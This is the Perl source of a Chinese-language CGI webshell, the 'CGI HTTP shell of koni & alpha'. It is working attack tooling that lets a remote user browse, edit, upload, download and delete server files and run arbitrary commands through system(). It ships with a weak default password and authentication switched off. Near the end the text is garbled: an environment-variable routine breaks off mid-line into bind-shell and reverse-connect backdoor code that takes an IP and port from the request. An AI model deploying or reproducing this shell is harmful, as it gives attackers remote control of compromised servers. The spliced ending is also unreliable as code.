#!c:/perl/bin/perl.exe

######################
##非iis服务请自行修改perl路径

##################################### WELCOME ##########################################
#                                                                                      #
#                              cgi http shell of koni version                          #   
#                                                                                      #
#          Code by alpha from www.54hack.com/www.securityfaq.org @ China			   #
#                                                                                      #
#           Thanks pinkeyes and lanker very much ,Thanks my parents too!               #
#                                                                                      #
############################ www.54hack.com/www.securityfaq.org ########################

use CGI qw(:all escape);
use CGI qw/:standard/; 

######################
##管理员密码设置,iis下情请不用密码认证，这个问题将在下一版本中解决

$checkpass="0";#密码认证采用cookie方式，"1"为需要认证，改成其它值则不用密码认证
$adpass="test";#管理员密码，可改成你喜欢的^_^

#######################
##window可写目录设置

$wpath="c:/windows/temp"; #请自己设置一个可写的目录，程序运行时用到，此设置仅用于windows系统

##########
# 一些系统变量

$uk=1;
$tz=-0;
$dispath=1;
#几个颜色变量
$c1="#006600";# 标题、已访问的链接和边框 - 缺省：暗绿
$c2="#000000";  # 文字 - 缺省：黑色
$c4="#E0E0E0";  # 指示/结果背景色 - 缺省：灰色
$c5="#008080";  # 页面背景色 - 缺省：黑色
$c6="#7F007F";  # 按钮背景区 (CCS) - 缺省：紫色
$c7="#FFFFFF";  # 按钮文字 (CCS) - 缺省：白色
$face="宋体,arial,helvetica,sans-serif"; # 字体设置
#图像及二进制文件扩展名
$imagefiles='gif|jp*g|png|bmp|ico|pdf|swf|qt|mov';

if ($ENV{CONTENT_TYPE}=~/multipart/i) {&transParse;}
else {&inParse;}
$sn="$ENV{SERVER_NAME}";
$root="$ENV{DOCUMENT_ROOT}";
$hst="$ENV{HTTP_HOST}";
$fnt="<FONT-FAMILY: 宋体;FONT-SIZE: 12pt>";
$fnt1="<FONT-FAMILY: 宋体;FONT-SIZE: 10pt>";
$fnt1w="<FONT-FAMILY: 宋体;FONT-SIZE: 12pt><FONT COLOR=red>";
$dcnt=0; $fcnt=0;


######################################
##用户登陆认证检测部分
if($checkpass=="1")
{
if (cookie('adpass') ne $adpass) 
{

	if($t{'password'} eq $adpass)
	{
		$cookie_name=cookie(-name =>'adpass',-value => $adpass);
		print header(-cookie =>$cookie_name);
		print "<meta http-equiv=\"refresh\" content=\"1;URL=\"" .$ENV{'SERVER_NAME'}.$ENV{'SCRIPT_NAME'}. ">";
		print "<html><body>Jumping.....</body></html>";
		exit;
	}
	else{
		print "Content-type: text/html\n\n";
		print "<html><body>\n";
		print <<"Wrong";
<html>
<style type="text/css">
input {
		font-family: "Verdana";
		font-size: "11px";
		BACKGROUND-COLOR: "#FFFFFF";
		height: "18px";
		border: "1px solid #666666";
}
</style>
<body>
<table>
<form action=$ENV{'SCRIPT_NAME'} method="post">
<font style="font-size: 17px; ">pass:</font><input type="text" name="password" class="input">&nbsp;<input type="submit" value="ok" class="input">
</form>
</table></body></html>
Wrong
exit;
	}

}
}



###############################################
##登陆注销部分

sub logout {
		$out_cookie="fkms**";
		$cookie_name1=cookie(-name =>'adpass',-value => $out_cookie);
		print header(-cookie =>$cookie_name1);
		print "<meta http-equiv=\"refresh\" content=\"1;URL=\"" .$ENV{'SERVER_NAME'}.$ENV{'SCRIPT_NAME'}. ">";
		exit;

}


##########
# 系统核心部分


$title="文件列表";
$t{'uk'}=$uk unless ($t{'uk'});
$usck=" CHECKED" if ($t{'uk'}==0);
$ukck=" CHECKED" if ($t{'uk'}==1);
$uk=$t{'uk'};
if (($t{'tz'}=~/\d+/)&&($t{'tz'}!=$tz)) {$tz=$t{'tz'};}
 else {$t{'tz'}=$tz;}
$t{'dispath'}=$dispath unless ($t{'dispath'});
$dispathck=" CHECKED" if ($t{'dispath'}==1);
$dispath=$t{'dispath'};
$action=$t{'action'};
if($action)
{if($action=="1")
	{&cmd;}
	if ($action=="2") {
		&env;
	}
	elsif($action=="3")
	{&backdoor;}
	elsif($action=="4"&&$checkpass=="1")
	{&logout;}
}

if (!$t{'run'}) {
	$t{'adminpro'}="$ENV{SCRIPT_NAME}";
 if (!$rut) {
  $_="$ENV{SCRIPT_FILENAME}";
  $_="$ENV{PATH_TRANSLATED}" if ($ENV{PATH_TRANSLATED});
 } else {$_="$ENV{SCRIPT_NAME}";}
 if($ENV{SERVER_SOFTWARE}=~/Microsoft/)
	{
	 $_="$ENV{PATH_TRANSLATED}";
	 ~s/\\/\//g;
 }
 /^(.*)\/(.+?)\.(.+?)$/;
 $path=$1; $script=$2; $ext=$3;
 $cgirootpath="$root$path";
 $cgipath=$1;
 $goinst=1;
 }
else {
 $path="$t{'path'}";
 if ($t{'newfile'}||$t{'newdir'}||$t{'mkfile'}=~/\w+/) {&runtest;}
 elsif (!$t{'test'}) {
 $goinst=1;
 }
 else {
  if (!(-e "$rut$path$t{'test'}")) {
  $title="错误 - 文件没发现！";
  }
  elsif ($t{'save'}) {
  $title="文件 \"$t{'test'}\" 已保存"; &save_edited;
  }
  elsif ($t{'edit'}) {
  $title="编辑文本文件：\"$t{'test'}\""; &edit;
  }
  elsif ($t{'rename'}) {
  $title="重命名：\"$t{'test'}\""; &rename;
  }
  elsif ($t{'download'}) {
  &download;
  }
  else {
  &runtest;
  }
 }
}
&result;


##########
# 重命名部分

sub rename {
$|=1;
&head;
print "Content-type: text/html\n\n";
print <<"Edit_Result";
$head<BR>
<CENTER><FORM NAME="renameitem" ACTION="$t{'adminpro'}" METHOD=get>
<TABLE BGCOLOR=#E0E0E7 CELLPADDING=3 CELLSPACING=0 BORDER=0 width=760><TR ALIGN=CENTER><TD>
<FONT  COLOR=$c1>重命名：<U>$t{'test'}</U></FONT><BR>
<INPUT TYPE=HIDDEN NAME="uk" VALUE="$t{'uk'}">
<INPUT TYPE=HIDDEN NAME="tz" VALUE="$t{'tz'}">
<INPUT TYPE=HIDDEN NAME="dispath" VALUE="$t{'dispath'}">
<INPUT TYPE=HIDDEN NAME="adminpro" VALUE="$t{'adminpro'}">
<INPUT TYPE=HIDDEN NAME="path" VALUE="$t{'path'}">
<INPUT TYPE=HIDDEN NAME="test" VALUE="$t{'test'}">
<INPUT TYPE=HIDDEN NAME="run" VALUE="yes">
<INPUT TYPE=TEXT NAME="newname" VALUE="$t{'newname'}" SIZE=36 MAXLENGTH=48><BR>
<INPUT TYPE=BUTTON VALUE="&lt; 后退"  onClick="JavaScript:history.go(-1); return true;"  STYLE="font:9pt $face;color:$c7;background-color:$c6;cursor:hand;"> &nbsp; 
<INPUT TYPE=RESET VALUE="重新设置"   STYLE="font:9pt $face;color:$c2;background-color:$c7;cursor:hand;"> &nbsp; 
<INPUT TYPE=SUBMIT NAME="execute" VALUE="重命名 "  STYLE="font:9pt $face;color:$c7;background-color:$c1;cursor:hand;">
</TD></TR></TABLE></FORM></CENTER>
$foot1
</center></BODY></HTML>
Edit_Result
$|=0;
exit;
}


##########
# 文件编辑部分

sub edit {
open(FILE,"$rut$path$t{'test'}");
binmode (FILE);
@b=<FILE>;
close (FILE);
while ($c=shift(@b)) {
$c=~s/</&lt;/g;
$c=~s/>/&gt;/g;

#$c=~s/<(.*)?>/&lt;$1&gt;/g;
$b.="$c";
}
push(@editfile,$b);
$|=1;
&head;
print "Content-type: text/html\n\n";
print <<"Edit_Result";
$head
<CENTER><FORM NAME="editfile" ACTION="$t{'adminpro'}" METHOD=POST>
<TABLE BGCOLOR=#E0E0E7 CELLPADDING=3 CELLSPACING=0 BORDER=0><TR ALIGN=CENTER><TD>
<FONT COLOR=$c1>编辑文本文件：<U>$t{'test'}</U></FONT><BR>
<INPUT TYPE=HIDDEN NAME="uk" VALUE="$t{'uk'}">
<INPUT TYPE=HIDDEN NAME="tz" VALUE="$t{'tz'}">
<INPUT TYPE=HIDDEN NAME="dispath" VALUE="$t{'dispath'}">
<INPUT TYPE=HIDDEN NAME="adminpro" VALUE="$t{'adminpro'}">
<INPUT TYPE=HIDDEN NAME="path" VALUE="$t{'path'}">
<INPUT TYPE=HIDDEN NAME="test" VALUE="$t{'test'}">
<INPUT TYPE=HIDDEN NAME="run" VALUE="yes">
<TEXTAREA NAME="filecontent" COLS=91 ROWS=28 WRAP=OFF STYLE="font:9pt courier,monospace;">@editfile</TEXTAREA><BR>
<INPUT TYPE=BUTTON VALUE="&lt; 后退"   onClick="JavaScript:history.go(-1); return true;"  STYLE="font:9pt $face;color:$c7;background-color:$c6;cursor:hand;"> &nbsp; 
<INPUT TYPE=RESET VALUE="重新设置"  STYLE="font:9pt $face;color:$c2;background-color:$c7;cursor:hand;"> &nbsp; 
<INPUT TYPE=SUBMIT NAME="save" VALUE="保存：$t{'test'}"  STYLE="font:9pt $face;color:$c7;background-color:$c1;cursor:hand;">
</TD></TR></TABLE>
</FORM></CENTER>
$foot1
</center></BODY></HTML>
Edit_Result
$|=0;
exit;
}


##########
# 保存编辑结果部分

sub save_edited {
open (FILE,">$t{'path'}$t{'test'}");
binmode (FILE);
$t{'filecontent'}=~s/[\r\n]{2}/\n/g;
#$FORM{'filecontent'}=~s/[\r\n]{2}/\n/g;
print FILE "$t{'filecontent'}";
close (FILE);
}


##########
# 文件下载部分

sub download {
open(FILE,"$rut$path$t{'test'}");
binmode (FILE);
@b=<FILE>;
close (FILE);
while ($c=shift(@b)) {$b.="$c";}
push(@dl,$b);
$|=1;
print "Content-Type: application/download
Content-Disposition: attachment; filename=$t{'test'}\n\n";
print @dl;
$|=0;
exit;
}


##########
# 建立新目录，建立新文件，删除或测试语法部分

sub runtest {

if ($t{'mkfile'})
	{
	 if (-e "$rut$path$t{'mkfile'}")
	 {
		 $title="失败：$t{'mkfile'} 已存在。";
	} else 
		{
		open(file,">$path$t{'mkfile'}");
		close(file);
		}
	if (-e "$rut$path$t{'mkfile'}") {
	$title="成功：$t{'mkfile'} 创建完成。";
	}
	else
		{ $title="失败：$t{'mkfile'} 创建完成。";}
 }

 if ($t{'newname'}) {
  if ($t{'newname'} eq $t{'test'}) {
 $title="失败：$t{'newname'} 和修改前相同。";
 } elsif (-e "$rut$path$t{'newname'}") {
 $title="失败：$t{'newname'} 已存在。";
 } else {
  rename("$rut$path$t{'test'}","$rut$path$t{'newname'}");
  if (-e "$rut$path$t{'newname'}") {
 $title="成功：$t{'test'} 已被重命名为：$t{'newname'}";
   }
  }
 } elsif ($t{'newdir'}=~/\w+/) {
  if (-e "$rut$path$t{'newdir'}") {
 $title="失败：$t{'newdir'} 已存在。";
 } else {
  mkdir("$rut$path$t{'newdir'}",0777);
  if (-e "$rut$path$t{'newdir'}") {
 $title="成功：$t{'newdir'} 创建完成。";
   }
  }
 } elsif ($t{'newfile'}) {&write_file;
 }

 

 
 elsif ($t{'delete'}) {
 unlink("$rut$path$t{'test'}");
  if (-e "$rut$path$t{'test'}") {
 $title="失败：无法删除 $t{'test'}"; undef($t{'test'});
  }
 else {
 $title="成功：已将 $t{'test'} 删除。"; undef($t{'test'});
  }
 }
 elsif ($t{'remove'}) {
 rmdir("$rut$path$t{'test'}");
  if (-e "$rut$path$t{'test'}") {
 $title="失败：无法删除 $t{'test'},可能目录非空"; undef($t{'test'});
  }
  else {
  $title="成功：已将 $t{'test'} 删除"; undef($t{'test'});
  }
 }
elsif (!$t{'chmod'}&&!$t{'newdir'}&&!$t{'newfile'}&&!$t{'newname'}&&!$t{'mkfile'}) {
$title="无法处理请求";
 }
}


##########
# 输出HTML结果部分

sub result {
&viewDir; 
&head;
$foot="</FONT></BODY></HTML>\n";
$|=1;
print "Content-type: text/html\n\n";

print<<"Print_Result";

$head
<CENTER>
<TABLE WIDTH="760" CELLPADDING=3 CELLSPACING=0 BORDER=0 bgcolor="#E0E0E7">
<TR ALIGN=CENTER VALIGN=TOP bgcolor="#cccccc">
<TD WIDTH=100% ALIGN=CENTER NOWRAP><NOBR>$fnt1w$title</FONT></NOBR></TD>
</TR>

<tr ALIGN=CENTER width=100%><td colspan="6" height="2"></td></tr></table>

<TABLE  CELLPADDING=2 CELLSPACING=2 BORDER=0 width=760 bgcolor="#E0E0E7">$return
<TR VALIGN=BOTTOM width=100%><TD COLSPAN=5 NOWRAP>$fnt1<FONT COLOR=$c1>$dhd/&nbsp;$fhd</TD></TR>
<TR VALIGN=BOTTOM width=100% bgcolor="#bbcccc"><TD  NOWRAP>
$fnt1<FONT COLOR=$c1>&nbsp;&nbsp;文件&nbsp; </FONT></TD><TD COLSPAN=1 ALIGN=CENTER NOWRAP>
$fnt1<FONT COLOR=$c1>&nbsp;操作&nbsp;</FONT></TD><TD ALIGN=CENTER NOWRAP>
$fnt1<FONT COLOR=$c1>&nbsp;大小&nbsp;</FONT></TD><TD  ALIGN=CENTER NOWRAP>
$fnt1<FONT COLOR=$c1>&nbsp;更新时间&nbsp;</FONT></TD><TD NOWRAP ALIGN=CENTER>$fnt1<FONT COLOR=$c1>&nbsp;属性</FONT></TD></TR>
$directorydata

$filedata
</TABLE></TD></TR>

</CENTER><BR>
$foot1
$foot

Print_Result
$|=0;
}

##########
# 输入转换

sub transParse {
$upload++;
#my $req=new CGI;$req->
($t{'path'}=param("path"))=~s/\/+/\//g;
$t{'adminpro'}=param("adminpro");
$t{'uk'}=param("uk");
$t{'tz'}=param("tz");
$t{'dispath'}=param("dispath");
$t{'run'}=param("run");
#$t{'newfile'}=param("newfile");
$t{'newdir'}=param("newdir");
$t{'bind_pass'}=param("bind_pass");
$t{'mkfile'}=param("mkfile");
$t{'action'}=param("action");
#$t{'password'}=param("password");
$t{'newfile'}=param("newfile");
$t{'password'}=param('password');
}


##########
# 文件上传检测部分

sub write_file {


my $file = param("newfile"); 
if ($file ne "") {
my $fileName = $file;
$fileName =~ s/^.*(\\|\/)//; #用正则表达式去除无用的路径名，得到文件名
open (OUTFILE, ">$rut$t{'path'}$fileName");
binmode(OUTFILE); #务必全用二进制方式，这样就可以放心上传二进制文件了。而且文本文件也不会受干扰
while (my $bytesread = read($file, my $buffer, 1024)) { 
print OUTFILE $buffer;
}
close (OUTFILE);
}

$newfile=$t{'newfile'};
 if (!$newfile) { $title="上传失败";
 }
 elsif ($flg) {$title="$newfile 上传失败";
 }
 elsif (-e "$rut$path$filename") {$title="$newfile 上传成功";
 }
 else {$title="$newfile 上传失败";
 }
}


##########
# 当前目录中的文件摘要部分

sub viewDir {
$hide='\.\.?$';

$return="<TR VALIGN=TOP><TD COLSPAN=8 NOWRAP><font color=red SIZE=2.5>&nbsp;当前路径:";

 if (length($path)>1) 
	 {
  ($path.="/")=~s/\/+/\//g;
	#$path=substr($path,0);
  @dirs=split(/\//,$path);
  $curdir=pop(@dirs);
   foreach $dir(@dirs) {
	if($dir=~/:/)
	   {$w.="$dir"}
	else{
   $w.="/$dir"; 
   }
   $w=~s/\/+/\//g;
    if (length($w)>1) {$return.="/<A HREF=\"$t{'adminpro'}?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($w)."&run=yes\" onMouseOver=\"window.status='去 \\'$dir\\' 目录'; return true;\" onMouseOut=\"window.status=''; return true;\" TITLE=\"点击这里去 '$dir' 目录\" STYLE=\"cursor:w-resize;\">$dir</A>";
   
   }
  }
 }
 if ($curdir) {$return.="/$curdir"; $return.="/$fnt1<BR>&nbsp;</FONT></FONT></TD></TR>\n\n";}
 else {$curdir="服务器根"; undef($return);}
 opendir (DIR,"$rut$path");
 @allfiles=grep(!/^$hide/,readdir(DIR));
 push(@allfiles,(readlink(DIR))) unless (!(readlink(DIR)));
 foreach $file(@allfiles) {
  $alf="<!- ".lc($file)." ->";
 $a="A";
 @filestats=stat("$rut$path$file");
  if (!$filestats[2]) {@filestats=lstat("$rut$path$file");
    $i="<I>"; $l=" <FONT COLOR=#909090>(链接)</FONT>";}
 $size=sprintf("%.1f",($filestats[7])/1024);
  if (($size<1)&&($size>0)) {$size="$filestats[7] b";}
   else {$size.=" k";}
  if ($size=="0.0 k") {$size="0 b";}
 $datemod=$filestats[9]; &date;
 ($fileperm=sprintf("%.0o",$filestats[2]))=~s/.*(.{3})$/$1/;
  if (!$filestats[2]) {$fileperm="<FONT COLOR=#808080>n/a</FONT>"; $a="! A"; $dis++;}
  else {
if (!$disablechmod) {
$set0=" document.adminpro.chmod.value=''; setperms();";
$set1=" document.adminpro.chmod.value=$fileperm; setperms();";
  }
 }
 # 如果它是一个目录
 if ((-d "$file")||($filestats[2]=~/^(16|17|41)/)) {
 $deldir="$trd";

 $deldir="<A HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&remove=yes&run=yes\" onClick=\"return verify('$file');\" >del</A>" if (!@subfiles);

push (@dlist,"$alf<TR VALIGN=TOP width=100%><TD NOWRAP>$fnt1$i&nbsp;<A HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path).escape($file)."%2F&run=yes\" ><font color=\"\#006699\">[$file]</font></A></TD>
<TD ALIGN=CENTER NOWRAP><$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&rename=yes&run=yes\"  STYLE=\"cursor:text;\">重命名</A>$l|$deldir</TD><TD ALIGN=CENTER>$fnt1 &lt;dir&gt;</TD>$filelastmod<TD ALIGN=CENTER NOWRAP>$fnt1$i$fileperm</TD></TR>\n");}

 # 如果它不是一个目录
 else {$a="A"; $tr=$tra; $do=$doc; $dl=$dla; $ex=$exa;
 if ($ENV{SCRIPT_NAME}=~/$file/) {
  $a="! A"; $tr=$trd; $do=$dod; $dl=$dld; $ex=$exd;
  }
 if ($file=~/\.($imagefiles)$/i) {$ficon=$img;}
 else {$ficon=$do;}
push (@flist,"$alf<TR VALIGN=TOP width=100%><TD NOWRAP width=20%>$fnt1$i&nbsp;<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&rename=yes&run=yes\" STYLE=\"cursor:text;\">$file</A>$l&nbsp;</TD>
<TD ALIGN=CENTER NOWRAP width=20%>$fnt1<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&edit=yes&run=yes\">编辑</A>
|$fnt1<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&download=yes&run=yes\" TARGET=\"edit\" >下载</A>&nbsp|<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&delete=yes&run=yes\"  onClick=\"return verify('$file');\" >删除</A></TD>
<TD ALIGN=RIGHT NOWRAP width=20%>$i$fnt1$size &nbsp&nbsp&nbsp</TD>\n<TD NOWRAP width=20% ALIGN=CENTER>$fnt1$i &nbsp; $moda-$yr | $hourmin</TD>\n<TD ALIGN=CENTER NOWRAP width=20%>$fnt1$i$fileperm</TD></TR>\n");}

undef($i); undef($l);
 }
closedir (DIR);

$hidden="<INPUT TYPE=HIDDEN NAME=\"adminpro\" VALUE=\"$t{'adminpro'}\"><INPUT TYPE=HIDDEN NAME=\"path\" VALUE=\"$path\">\n<INPUT TYPE=HIDDEN NAME=\"run\" VALUE=\"execute\">\n<INPUT TYPE=HIDDEN NAME=\"newdir\">\n";
#newdir新建文件夹用
$newfil="<tr  width=100% bgcolor=#ffffff><td colspan=\"6\" height=\"5\"></td></tr><TR><TD COLSPAN=7 NOWRAP><NOBR><FORM NAME=\"dirform\" ACTION=\"$t{'adminpro'}\" METHOD=GET>$hidden$fnt1新建文件夹：<INPUT TYPE=TEXT NAME=\"newdir\" SIZE=18 STYLE=\"font:9pt;\"  document.adminpro.test.value=this.value; document.adminpro.syntax.checked=0;$set0 return false;\" onKeyUp=\"document.adminpro.test.value=this.value; document.adminpro.newdir.value=this.value; return false;\" class=\"input\"></NOBR>&nbsp;<INPUT TYPE=SUBMIT  VALUE=\"确定\" class=\"input\"  ></TD><TD width=0></FORM></TD></TR>\n\n
<TR><TD COLSPAN=7 NOWRAP BGCOLOR=\"#CCCCCC\"><NOBR><FORM NAME=\"dirform\" ACTION=\"$t{'adminpro'}\" METHOD=GET>$hidden$fnt1新建文件&nbsp;&nbsp;：<INPUT TYPE=TEXT NAME=\"mkfile\" SIZE=18 STYLE=\"font:9pt;\"  document.adminpro.test.value=this.value; document.adminpro.syntax.checked=0;$set0 return false;\" onKeyUp=\"document.adminpro.test.value=this.value; document.adminpro.newdir.value=this.value; return false;\" class=\"input\"></NOBR>&nbsp;<INPUT TYPE=SUBMIT  VALUE=\"确定\" class=\"input\"></TD><TD width=0></FORM></TD></TR>
<TR><TD COLSPAN=7 NOWRAP><NOBR><FORM method=\"POST\" NAME=\"filform\" ACTION=\"$t{'adminpro'}\" ENCTYPE=\"multipart/form-data\" >$hidden$fnt1<input type=\"hidden\" name=action value=5>$fnt1上传文件:<INPUT TYPE=FILE NAME=\"newfile\" SIZE=12 MAXLENGTH=80  class=\"input\">&nbsp;<INPUT TYPE=SUBMIT NAME=\"run\" VALUE=\"上传\" class=\"input\"></TD><TD></form></NOBR></TD>
</TR>\n\n";
#$dcnt，$fcnt为文件夹和文件个数
 $dcnt=@dlist; $fcnt=@flist;
 @dlist=sort(@dlist); 
 @flist=sort(@flist);
 if ($dcnt<1) {
$directorydata="<TR><TD COLSPAN=8>$fnt1 &nbsp;</TD></TR>\n\n";
 } else {
 $d1=1; 
   foreach $dlist(@dlist) {
    if ($d1==1) {$alt1=" BGCOLOR=#CCCCCC"; $d1--;}
    else {undef($alt1); $d1++;}
   $dlist=~s/<TR/<TR$alt1/g;
   $directorydata.=$dlist;
   }
$directorydata.="<TR><TD COLSPAN=8>$fnt1 &nbsp;</TD></TR>\n\n";
   }
 if ($fcnt<1) {$filedata="$newfil";
 } else {$f1=1; push(@flist,$newfil);
   foreach $flist(@flist) {
    if ($f1==1) {$alt2=" BGCOLOR=#CCCCCC"; $f1--;}
    else {undef($alt2); $f1++;}
   $flist=~s/<TR/<TR$alt2/g;
   $filedata.=$flist;}
   }
 if ($dcnt==1) {$dhd="&nbsp;$dcnt 个目录";}
  else {$dhd="&nbsp;$dcnt 个目录";}
 if ($fcnt==1) {$fhd="$fcnt 个文件";}
  else {$fhd="$fcnt 个文件";}

 $tot=($dcnt+$fcnt);
 if ($dis==$tot) {
$disablechmod=" ";

}

}


##########
# 日期计算部分

sub date {
 $datemod=$datemod+($tz*3600);
 ($se,$mn,$ho,$da,$mo,$yr)=localtime($datemod);
 $mo=($mo+1); $yr=($yr+1900);
  if ($ho>=12) {$ampm="pm";} else {$ampm="am";}
  if ($ho<1) {$ho=12;}
  if ($ho>=13) {$ho=($ho-12);}
 $mo=sprintf("%02.0f",$mo);
 $ho=sprintf("%02.0f",$ho);
 $mn=sprintf("%02.0f",$mn);
 $se=sprintf("%02.0f",$se);
 $hourmin="$ho:"."$mn:$se"."&nbsp;$ampm";
 $da=sprintf("%02.0f",$da);
 $moda="$mo-$da";
 $filelastmod="<TD NOWRAP ALIGN=CENTER>$fnt1$i &nbsp $moda-$yr |  $hourmin</TD>";
}

##########
# 解析部分

sub inParse {

	binmode(STDIN);
	binmode(STDOUT);
	binmode(STDERR);
 $method=$ENV{REQUEST_METHOD};
 if ($method=~/get/i) {
 $buffer=$ENV{QUERY_STRING};
 } elsif ($method=~/post/i) {
  read (STDIN,$buffer,$ENV{CONTENT_LENGTH});
 } 



##########
# 匹配字符和值部分

 @pairs=split(/&/,$buffer);
 foreach $pair(@pairs) {
  ($name, $value)=split(/=/,$pair);
  $value=~tr/+/ /;
  $value=~s/%([a-fA-F0-9][a-fA-F0-9])/pack("C",hex($1))/eg;
  if ($method!~/post/i) {
  $value=~s/\s+/ /g;
  $value=~s/磡搢攟抾諀?'/g;
  $value=~s/\*|\!|\+|\$|\^|\#|\%//g;
  $value=~s/\?/%3F/g;
  }
  $t{$name}=$value;
 }
}

##########
# 页首部分

sub head {
if(($ENV{SERVER_SOFTWARE}=~/Win32/)||($ENV{SERVER_SOFTWARE}=~/Microsoft/))
	{$os="Windows";}
else
	{$os="*nix";}

if(!$path)
	{


if($ENV{SERVER_SOFTWARE}=~/Microsoft/)
	{
	 $_= $ENV{PATH_TRANSLATED};
	~s/\\/\//g;
	/^(.*)\/(.+?)\.(.+?)$/;
	$path=$1;
 }
 else{
	 $_="$ENV{SCRIPT_FILENAME}";
	/^(.*)\/(.+?)\.(.+?)$/;
	$path=$1;
 }

	
	}
if($ENV{SERVER_SOFTWARE}=~/Microsoft/)
	{
	 $filepat= $ENV{PATH_TRANSLATED};
 }
 else{
	 $filepat=$ENV{SCRIPT_FILENAME};
 }

$head=<<"Head";

<HTML><HEAD><TITLE>cgi webshell(Alpha制作) | $title</TITLE>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">

<SCRIPT LANGUAGE="JavaScript">
<!---// Begin script
function verify(file) {
 if (confirm('彻底删除\\n     ' + file + '\\n你能确定吗？')) {return true;}
 else {alert('对\\n     ' + file + '\\n的删除操作已取消。'); return false;}
}
function getFilName() {
	var filName;
	var filPath=document.filform.newfile.value;
	var i=filPath.length-1;
	while((i>=0)&&(filPath.charAt(i)!="/")) {i--;}
	filName=filPath.substring(i+1,filPath.length);
	return filName;
}
// end script -->
</SCRIPT>

<STYLE TYPE="text/css">
TD {font:9pt $face;}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
}
	A:link {text-decoration:underline;color:$c2}
	A:visited {text-decoration:underline;color:$c1;}
	A:active {text-decoration:none;color:$c7;background-color:$c6;}
	A:hover {text-decoration:none;color:$c7;background-color:$c6;}
</STYLE>

</HEAD>
<BODY  MARGINWIDTH=0 MARGINHEIGHT=0 LEFTMARGIN=0 RIGHTMARGIN=0 TOPMARGIN=0 BOTTOMMARGIN=0 TEXT=000000 LINK=$c2 ALINK=FF0000 VLINK=$c1 onLoad="document.adminpro.test.focus();$disablechmod">
<BASEFONT SIZE=2><A NAME="top"></A>$fnt1

<center><table width=760 bgcolor="#FFFFFF" cellspacing="1" border="0" cellpadding="3">
<tr ><td align=right><font color="red">OS: $os</font></td></tr>
<tr bgcolor="#E0E0EE" width=100% align=center><td><B>$fnt1 CGI HTTP SHELL OF KONI & ALPHA </B></a></font></td></tr>
<tr bgcolor=""><td align=center bgcolor="#cccccc"><a href=?action=4>退出登陆</a> | <a href= ?>文件浏览</a> | <a href=?action=1>webshell</a> | <a href=?action=2>环境变量</a> | <a href=?action=3>系统后门</a> | <a href="http://www.securitfaq.com" target="a_blank">新版本</a></td></tr>
<tr bgcolor="#E7E7E7"><td>$fnt1&nbsp;当前程序：$filepat</td></tr>
<tr bgcolor="#E7E7E7"><td>$fnt1&nbsp;当前目录：$path</td></tr>
<tr bgcolor="#E7E7E7"><form action="" method="GET">
<td>$fnt1 &nbsp;跳转到&nbsp;&nbsp;：
		<input type="hidden" name="dispath" value="1" >
		<input type="hidden" name="run" value="yes" >
        <input name="path" type="text" value="$path" size="40" class="input">
        <input type="submit"  value="确定" class="input">
 </font></td></form></tr>
	<tr></tr>
	<tr><td><hr></td></tr>
	<tr><td align=center ><font color=red  ><B>Code by <a href="mailto:netsh\@163.com">alpha</a> \@ cnwill of China,Welcome to <a href="http://www.securitfaq.com" target="a_blank">www.securitfaq.com</a>!</B></td></tr>
</table>
</center>
Head

@a=localtime();
if(@a[2]<7||@a[2]>19)
	{$msg="Safe time";
}
else{$msg="Working time!";
}

#页尾
$foot1=<<Foot;
</table><center><hr width="760" noshade>
<table width="760" border="0" cellpadding="0" >
  <tr>
    <td><B>Copyright (C) 2004~2005 Alpha 出品</B></td><td><b><font color=red>Now: @a[2]:@a[1]:@a[0] $msg</font></B><td>
    <td align="right">Don't ask me who is koni ^_^ </td>
  </tr>
Foot
}


###############################
##shell部分
sub cmd{
$title="webshell";
&head;
$_ = $t{"cmd"};
s/\+/ /ig;
s/%20/ /ig;
s/%2f/\//ig;
s/%3A/:/ig;
s/%5C/\\/ig;
$exec = $_;
open(STDERR, ">&STDOUT") || die "Can't redirect STDERR";

print "$head";
print "<center><table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
print "<tr> <td align=\"center\" bgcolor=\"#E0E0EE\"><B>WebShell </B></td></tr>\n";
print "<form action=\"\" method=\"post\">\n";
print "<tr><td bgcolor=\"#E0E0E0\" align=\"center\"><font  color=\"#006600\">输入指令：</font><input type=\"hidden\" name=action value=\"1\"><input type=\"text\" name=\"cmd\" value=\"$_\" size=80 class=\"input\">&nbsp;<input type=submit value=\"确定\" class=\"input\">\n";
print "</td></tr></form>\n";

print "<tr><td bgcolor=\"#E0E0E7\" align=\"center\"><textarea name=\"textarea\" cols=\"101\" rows=\"25\" readonly>\n";
system($exec);
print "</textarea></td></tr></table></center>\n";
print "$foot1 </center>";
print "</font></body></HTML>\r\n";
close(STDERR);
exit;
}


###############################
##环境变量
sub env{
$title="环境变量";
&head;
print "Content-type: text/html\n\n";
print <<"Env";
$head;
<CENTER>
<table width=760 border=0 CELLP.$t{'port'}." &";
 $blah=system($bind_string);
 $title1="后门已打开.......";
  
  }

# back connect Perl 
if ($t{'ip'} && $t{'port'} && ($t{'use'}=="1"))
{
 open(FILE,">$wpath/testb.pl");
 print FILE $wbackp;
 close(FILE);

